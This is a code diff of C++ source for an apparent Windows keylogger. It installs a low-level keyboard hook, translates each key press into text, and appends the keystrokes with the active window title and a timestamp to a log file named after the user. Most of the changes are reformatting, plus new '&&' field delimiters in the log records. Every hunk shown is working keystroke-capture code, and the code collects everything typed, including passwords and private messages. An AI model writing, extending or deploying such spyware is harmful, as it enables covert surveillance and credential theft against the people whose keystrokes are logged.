@@ -16,7 +16,7 @@ void SetFileName()
     char username[UNLEN + 1];
     DWORD usernamelen = UNLEN + 1;
     GetUserNameA(username, &usernamelen);
-    //wstring uname(username);
+    // wstring uname(username);
     strcpy(FILENAME, username);
     strcat(FILENAME, ".log");
 }
@@ -24,25 +24,32 @@ void SetFileName()
 void Write(string key)
 {
     wchar_t windowname[256];
-    GetWindowTextW(GetForegroundWindow(), (wchar_t *)curr_window, sizeof(curr_window));
+    HWND fgwindowhandler = GetForegroundWindow();
+    GetWindowTextW(fgwindowhandler, (wchar_t *)curr_window, sizeof(curr_window));
 
     ofstream fout(FILENAME, ios::app);
     if (fout.is_open())
     {
         string towrite = "";
-        if (wcscmp(prev_window, curr_window) != 0) //current window != previous window
+        if (wcscmp(prev_window, curr_window) != 0) // current window != previous window
         {
             wstring _cwindow(curr_window);
             string temp(_cwindow.begin(), _cwindow.end());
-            towrite += "\n"+temp;
+            towrite += "\n&&" + temp;
             towrite += "\t";
             time_t current_time = time(NULL);
             char *dt = ctime(&current_time);
+            towrite += "&&";
             towrite += dt;
             towrite += "\t";
+            towrite += "&&";
             towrite += key;
             wcscpy(prev_window, curr_window);
         }
+        /*else if(fgwindowhandler)
+        {
+
+        }*/
         else
             towrite += key;
         fout.write(towrite.c_str(), towrite.length());
@@ -68,7 +75,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             {
             case 0x41:
             {
-                Write(wParam==WM_SYSKEYDOWN? "ā": (caps ? (shift ? "a" : "A") : (shift ? "A" : "a")));
+                Write(wParam == WM_SYSKEYDOWN ? "ā" : (caps ? (shift ? "a" : "A") : (shift ? "A" : "a")));
                 break;
             }
             case 0x42:
@@ -562,7 +569,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
                 Write("[F12]");
                 break;
             }
-            case VK_VOLUME_DOWN:{
+            case VK_VOLUME_DOWN:
+            {
                 Write("[VOL DOWN]");
                 break;
             }
@@ -576,15 +584,15 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
                 Write("[VOL MUTE]");
                 break;
             }
-            case VK_MEDIA_PLAY_PAUSE: 
+            case VK_MEDIA_PLAY_PAUSE:
             {
                 Write("[PLAY/PAUSE]");
                 break;
-            } 
-            default: //handling any other 'extended keys'
+            }
+            default: // handling any other 'extended keys'
             {
-                DWORD dWord = key->scanCode << 16; //scancode is from bit 16-23 in lParam (scancode != virtual key code)
-                dWord += key->flags << 24; //Extended key flag lies at bit 24
+                DWORD dWord = key->scanCode << 16; // scancode is from bit 16-23 in lParam (scancode != virtual key code)
+                dWord += key->flags << 24;         // Extended key flag lies at bit 24
                 char otherKey[16] = "";
                 if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0)
                     Write(otherKey);
@@ -592,7 +600,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
         }
     }
-    return CallNextHookEx(NULL, nCode, wParam, lParam); //compulsory call to next hook procedure (in this case there is no next hook procedure, hence first parameter is NULL)
+    return CallNextHookEx(NULL, nCode, wParam, lParam); // compulsory call to next hook procedure (in this case there is no next hook procedure, hence first parameter is NULL)
 }
 
 void HookUnhook()
@@ -605,18 +613,21 @@ void HookUnhook()
         caps = GetKeyState(VK_CAPITAL);
         numlock = GetKeyState(VK_NUMLOCK);
         BOOL mret;
-        while((mret = GetMessage(&msg, NULL, 0, 0))!=0){
-            if(mret==-1){
+        while ((mret = GetMessage(&msg, NULL, 0, 0)) != 0)
+        {
+            if (mret == -1)
+            {
                 perror("Error occured with GetMessage. Terminating...");
                 exit(EXIT_FAILURE);
             }
-            else{
+            else
+            {
                 TranslateMessage(&msg);
                 DispatchMessage(&msg);
             }
         }
 
-        if(UnhookWindowsHookEx(hook)==0)
+        if (UnhookWindowsHookEx(hook) == 0)
             cout << "Error uninstalling hook procedure";
         CloseHandle(hook);
     }
